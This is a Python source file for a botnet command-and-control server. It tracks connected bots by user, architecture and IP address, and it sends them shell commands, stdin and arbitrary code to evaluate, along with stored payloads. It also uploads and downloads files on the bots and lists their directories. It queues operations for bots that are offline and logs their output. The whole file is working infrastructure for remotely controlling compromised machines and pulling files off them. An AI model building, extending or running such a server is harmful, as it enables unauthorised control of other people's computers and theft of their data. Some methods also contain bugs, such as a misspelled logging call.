from server import formatsock
from server.botfilemanager import BotNetFileManager
from server.botpayloadmanager import BotNetPayloadManager

import json
from threading import Thread
import threading
import select
import base64
import os
import time
import uuid


class BotNet(Thread):
    INPUT_TIMEOUT = 1
    PRINTOUT_JSON = 'printout'
    ERROUT_JSON = 'errout'
    STDOUT_JSON = 'stdout'
    STDERR_JSON = 'stderr'
    SPEC_JSON = 'special'
    FILESTREAM_JSON = 'filestreams'
    FILECLOSE_JSON = 'fileclose'
    LS_JSON = 'ls'
    FILESIZE_JSON = 'filesize'

    DEFAULT_PAYLOAD = os.path.join(os.path.dirname(__file__), 'payloads')
    DEFAULT_DOWNLOADPATH = os.path.join(os.path.join(os.path.dirname(__file__), 'media'), 'downloads')

    def __init__(self, socketio, payloadpath=DEFAULT_PAYLOAD, downloadpath=DEFAULT_DOWNLOADPATH):
        super().__init__()
        self.connlock = threading.Lock()
        self.conncon = threading.Condition(self.connlock)
        self.onlineConnections = {}
        self.offlineConnections = {}
        self.logs = {}
        self.socketio = socketio

        self.filemanager = BotNetFileManager(downloadpath)
        self.payloadmanager = BotNetPayloadManager(payloadpath)
        self.downloaddir = downloadpath

    def hasConnection(self, user):
        with self.connlock:
            if user in self.offlineConnections:
                return True
            return user in self.onlineConnections

    def addConnection(self, user, clientsock, host_info, socketio):
        print("[*] Adding connection {}".format(user))
        with self.connlock:
            if user in self.offlineConnections:
                print("\tRestoring connection...")
                conn = self.offlineConnections[user]
                conn.setip(host_info['addr'])
                conn.setsocket(clientsock)
                print("\tRestored!")
            else:
                conn = Bot(clientsock, host_info, socketio)
            if conn.bid is None:
                conn.setId(str(uuid.uuid4()))
            self.onlineConnections[user] = conn
            self.logs[user] = BotLog(user)
            self.conncon.notifyAll()
            # Notify recv thread
            self.socketio.emit('connection', {'user': user}, namespace='/bot')

    def removeConnection(self, user):
        # Will be making changes to allConnections
        print("[*] Removing user {}".format(user))
        with self.connlock:
            if user in self.onlineConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.onlineConnections[user].close()
                except IOError:
                    pass
                # Remove object, don't delete so sends still go through
                self.onlineConnections.pop(user)
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))
            elif user in self.offlineConnections:
                self.offlineConnections.pop(user)

    def setOffline(self, user):
        # Will be making changes to allConnections
        print("[*] Setting {} offline".format(user))
        with self.connlock:
            if user in self.onlineConnections:
                # Wait for any sends to go through for this bot
                # terminate and remove
                try:
                    self.onlineConnections[user].close()
                except IOError:
                    pass
                conn = self.onlineConnections.pop(user)
                self.offlineConnections[user] = conn
                self.socketio.emit('disconnect', {'user': user}, namespace='/bot')
                print("[-] Lost connection to {}".format(user))

    def getOnlineConnections(self):
        with self.connlock:
            return self.onlineConnections.keys()

    def getConnectionDetails(self, spec=None):
        """
        Returns a dictionary of {[username]:{"online":[T/F], "lastonline":[unixtime], "arch":[arch]}, ...}
        """
        with self.connlock:
            if spec:
                if spec in self.onlineConnections:
                    bot = self.onlineConnections[spec]
                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                elif spec in self.offlineConnections:
                    bot = self.offlineConnections[spec]
                    return dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                else:
                    return {}
            else:
                dets = {}
                for username in self.onlineConnections.keys():
                    bot = self.onlineConnections[username]
                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                for username in self.offlineConnections.keys():
                    bot = self.offlineConnections[username]
                    dets[username] = dict(online=bot.online, lastonline=bot.lastonline, arch=bot.arch, ip=bot.ip)
                return dets

    def run(self):
        while True:
            with self.connlock:
                bots = list(self.onlineConnections.values())
                while len(bots) == 0:
                    self.conncon.wait()
                    bots = list(self.onlineConnections.values())
            # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
            # TODO maybe use pipe as interrupt instead of timeout?
            rs, _, _ = select.select(bots, [], [], BotNet.INPUT_TIMEOUT)
            # We now have a tuple of all bots that have sent data to the botnet
            for bot in rs:
                user = bot.user
                try:
                    msg = bot.recv()
                    jsonobj = json.loads(msg.decode('UTF-8'))
                    printout = ""
                    errout = ""
                    out = ""
                    err = ""
                    special = {}
                    filestream = {}
                    fileclose = []

                    if BotNet.PRINTOUT_JSON in jsonobj:
                        printout = jsonobj[BotNet.PRINTOUT_JSON]
                    if BotNet.ERROUT_JSON in jsonobj:
                        errout = jsonobj[BotNet.ERROUT_JSON]
                    if BotNet.STDOUT_JSON in jsonobj:
                        out = jsonobj[BotNet.STDOUT_JSON].rstrip()
                    if BotNet.STDERR_JSON in jsonobj:
                        err = jsonobj[BotNet.STDERR_JSON].rstrip()
                    if BotNet.SPEC_JSON in jsonobj:
                        special = jsonobj[BotNet.SPEC_JSON]
                    if BotNet.FILESTREAM_JSON in jsonobj:
                        filestream = jsonobj[BotNet.FILESTREAM_JSON]
                    if BotNet.FILECLOSE_JSON in jsonobj:
                        fileclose = jsonobj[BotNet.FILECLOSE_JSON]

                    # Forward stdout/stderr... as needed
                    totallen = len(printout) + len(errout) + len(out) + len(err)
                    if totallen > 0:
                        # Send through socket
                        self.socketio.emit('response',
                                           {'user': user,
                                            'printout': printout,
                                            'errout': errout,
                                            'stdout': out,
                                            'stderr': err},
                                           namespace="/bot")
                        # Separate to minimize time in Lock
                        log = None
                        with self.connlock:
                            if user in self.logs:
                                log = self.logs[user]
                        if log:
                            log.logstdout(printout)
                            log.logstderr(errout)
                            log.logstdout(out)
                            log.logstderr(err)

                    if len(special) > 0:
                        if BotNet.LS_JSON in special:
                            self.socketio.emit('finder',
                                               {'special': special,
                                                'user': user},
                                               namespace="/bot")
                        if BotNet.FILESIZE_JSON in special:
                            self.socketio.emit('success', {'user': user,
                                                           'message': "File download beginning",
                                                           'type': 'download'},
                                               namespace='/bot')
                            fileinfo = json.loads(special[BotNet.FILESIZE_JSON])
                            self.filemanager.setFileSize(user, fileinfo['filename'], fileinfo['filesize'])

                    # Forward file bytes as needed
                    for filename in filestream.keys():
                        # Get the b64 encoded bytes from the client in string form, change to normal bytes
                        filebytes = base64.b64decode(filestream[filename])
                        self.filemanager.appendBytesToFile(user, filename, filebytes)

                    for filename in fileclose:
                        self.filemanager.closeFile(user, filename)

                except IOError as e:
                    # Connection was interrupted, set to offline
                    print(e)
                    self.setOffline(user)

    def getLog(self, user):
        with self.connlock:
            log = []
            if user in self.logs:
                for entry in self.logs[user].log:
                        log.append(entry)
            return log

    def clearLog(self, user):
        with self.connlock:
            if user in self.logs:
                self.logs[user].log = []

    def sendKillProc(self, user):
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].send("True", sendtype="kill")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendStdin(self, user, cmd):
        with self.connlock:
            if user in self.onlineConnections:
                self.logs[user].logstdin(cmd)
                self.onlineConnections[user].send(cmd, sendtype="stdin")
                return True
            elif user in self.offlineConnections:
                print("Sending offline")
                self.logs[user].logstdin(cmd)
                self.offlineConnections[user].send(cmd, sendtype="stdin")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendCmd(self, user, cmd):
        with self.connlock:
            if user in self.onlineConnections:
                self.logs[user].logsdin("(cmd \""+cmd+"\")")
                self.onlineConnections[user].send(cmd, sendtype="cmd")
                return True
            elif user in self.offlineConnections:
                self.logs[user].logsdin("(cmd \""+cmd+"\")")
                self.offlineConnections[user].send(cmd, sendtype="cmd")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendEval(self, user, cmd):
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].send(cmd, sendtype="eval")
                return True
            elif user in self.offlineConnections:
                self.offlineConnections[user].send(cmd, sendtype="eval")
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def sendFile(self, user, filename, fileobj):
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].sendFile(filename, fileobj)
                return True
            elif user in self.offlineConnections:
                self.offlineConnections[user].sendFile(filename, fileobj)
                return True
            self.socketio.emit('response',
                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
            return False

    def startFileDownload(self, user, filename):
        with self.connlock:
            if user in self.onlineConnections:
                if not self.filemanager.fileIsDownloading(user, filename):
                    self.onlineConnections[user].startFileDownload(filename)
                return True
            elif user in self.offlineConnections:
                if not self.filemanager.fileIsDownloading(user, filename):
                    self.offlineConnections[user].startFileDownload(filename)
                return True
            return None

    def getPayloadNames(self):
        return self.payloadmanager.getPayloadNames()

    def getPayloads(self):
        return self.payloadmanager.getPayloads()

    def sendPayload(self, user, payload, args):
        payloadtext = self.payloadmanager.getPayloadText(payload, args)
        if payloadtext:
            with self.connlock:
                if user in self.logs:
                    self.logs[user].logstdin("(payload \"" + payload + "\")")
            return self.sendEval(user, payloadtext)
        else:
            return False

    def requestLs(self, user, filename):
        with self.connlock:
            if user in self.onlineConnections:
                self.onlineConnections[user].requestLs(filename)

    def getFileManager(self):
        return self.filemanager

    def getDownloadFiles(self):
        return self.filemanager.getFilesAndInfo()

    def getFileName(self, user, filename):
        return self.filemanager.getFileName(user, filename)

    def deleteFile(self, user, filename):
        return self.filemanager.deleteFile(user, filename)


class Bot:
    FILE_SHARD_SIZE = 4096
    FILE_STREAM = 'fstream'
    FILE_CLOSE = 'fclose'
    FILE_FILENAME = 'fname'
    CLIENT_STREAM = 'cstream'
    CLIENT_CLOSE = 'cclose'
    FILE_DOWNLOAD = 'down'
    LS_JSON = 'ls'
    ASSIGN_ID = 'assign'

    def __init__(self, sock, host_info, socketio, lastonline=int(time.time()), online=True):
        self.sock = formatsock.FormatSocket(sock)
        self.user = host_info['user']
        self.arch = host_info['arch']
        self.ip = host_info['addr']
        self.bid = host_info['bid']

        self.socketio = socketio
        self.lastonline = lastonline

        # Threads can acquire RLocks as many times as needed, important for the queue
        self.datalock = threading.RLock()
        self.online = online
        # Opqueue is a list of tuples of (function, (args...)) to be done once
        # the bot in online
        self.opqueue = []

    def send(self, cmd, sendtype="stdin"):
        print("[*] Sending command of type {} to {}".format(sendtype, self.user))
        json_str = json.dumps({sendtype: cmd})
        with self.datalock:
            if self.online:
                self.sock.send(json_str)
            else:
                self.opqueue.append((self.send, (cmd, sendtype)))

    def setId(self, bid):
        print("[*] Setting bot id to {}".format(bid))
        json_str = json.dumps({Bot.ASSIGN_ID:bid})
        with self.datalock:
            if self.online:
                self.sock.send(json_str)
                self.bid = bid
            else:
                self.opqueue.append((self.setId,(bid,)))

    def recv(self):
        # Getting the object requires a lock, using it doesn't
        with self.datalock:
            sock = self.sock

        # Try to receive, on error set offline
        try:
            return sock.recv()
        except IOError as e:
            # Setting offline requires a lock
            with self.datalock:
                self.online = False
                self.lastonline = int(time.time())
                raise e

    def setsocket(self, newsock, nowonline=True):
        with self.datalock:
            if self.online:
                self.sock.close()
            self.sock = formatsock.FormatSocket(newsock)
            self.online = nowonline
            if self.online:
                self.lastonline = int(time.time())
                # Run operations if needed, this is where
                # the RLock distinction is needed
                for runop in self.opqueue:
                    func, args = runop
                    func(*args)
                self.opqueue.clear()

    def setip(self, ip):
        with self.datalock:
            self.ip = ip

    def close(self):
        with self.datalock:
            if self.online:
                self.online = False
                self.lastonline = int(time.time())
                try:
                    self.sock.close()
                    return True
                except IOError:
                    return False
            return False

    def fileno(self):
        """
        Returns the OS fileno of the underlying socket, that way the
        OS can wait for IO on the fileno and allow us to serve many bots
        simultaneously
        """
        with self.datalock:
            if self.online:
                return self.sock.fileno()
            else:
                return -1

    def sendFile(self, filename, fileobj):
        with self.datalock:
            if self.online:
                t = Thread(target=self.__sendFileHelper(fileobj, filename))
                t.start()
            else:
                self.opqueue.append((self.sendFile, (filename, fileobj)))

    def sendClientFile(self, fileobj):
        self.sendFile(None, fileobj)

    def __sendFileHelper(self, fileobj, filename=None):
        dat = fileobj.read(Bot.FILE_SHARD_SIZE)
        if len(dat) > 0:
            while len(dat) > 0:
                # Turn the bytes into b64 encoded bytes, then into string
                bytestr = base64.b64encode(dat).decode('UTF-8')
                if filename:
                    # Particular file
                    json_str = json.dumps({Bot.FILE_STREAM: bytestr, Bot.FILE_FILENAME: filename})
                else:
                    # Client file
                    json_str = json.dumps({Bot.CLIENT_STREAM: bytestr})
                with self.datalock:
                    self.sock.send(json_str)
                dat = fileobj.read(Bot.FILE_SHARD_SIZE)
            if filename:
                json_str = json.dumps({Bot.FILE_CLOSE: filename})
            else:
                json_str = json.dumps({Bot.CLIENT_CLOSE: True})
            with self.datalock:
                self.sock.send(json_str)
                fileobj.close()
                self.socketio.emit('success', {'user': self.user,
                                               'message': "File upload successful",
                                               'type': 'upload'},
                                   namespace='/bot')

    def startFileDownload(self, filename):
        with self.datalock:
            if self.online:
                json_str = json.dumps({Bot.FILE_DOWNLOAD: filename})
                self.sock.send(json_str)
            else:
                self.opqueue.append((self.startFileDownload, (filename,)))

    def requestLs(self, filename):
        with self.datalock:
            if self.online:
                json_str = json.dumps({Bot.LS_JSON: filename})
                self.sock.send(json_str)
            else:
                self.opqueue.append((self.requestLs, (filename,)))


class BotLog:
    STDOUT = 0
    STDERR = 1
    STDIN = 2

    def __init__(self, user, maxlen=100, logdir="logs"):
        self.user = user
        self.log = []
        self.maxlen = maxlen
        if not os.path.isdir(logdir):
            os.mkdir(logdir)
        self.logpath = os.path.join(logdir, user+".log")
        self.logobj = open(self.logpath, "a")

    def logstdin(self, win):
        if len(win) > 0:
            try:
                self.log.append((BotLog.STDIN, win))
                self.logobj.write("[IN]: \t" + str(win) + ("\n" if win[-1] != "\n" else ""))
                self.logobj.flush()
                if len(self.log) > self.maxlen:
                    self.log.pop()
            except IOError:
                pass

    def logstdout(self, wout):
        if len(wout) > 0:
            try:
                self.log.append((BotLog.STDOUT, wout))
                self.logobj.write("[OUT]:\t" + str(wout) + ("\n" if wout[-1] != "\n" else ""))
                self.logobj.flush()
                if len(self.log) > self.maxlen:
                    self.log.pop()
            except IOError:
                pass

    def logstderr(self, wout):
        if len(wout) > 0:
            try:
                self.log.append((BotLog.STDERR, wout))
                self.logobj.write("[ERR]:\t" + str(wout) + ("\n" if wout[-1] != "\n" else ""))
                self.logobj.flush()
                if len(self.log) > self.maxlen:
                    self.log.pop()
            except IOError:
                pass
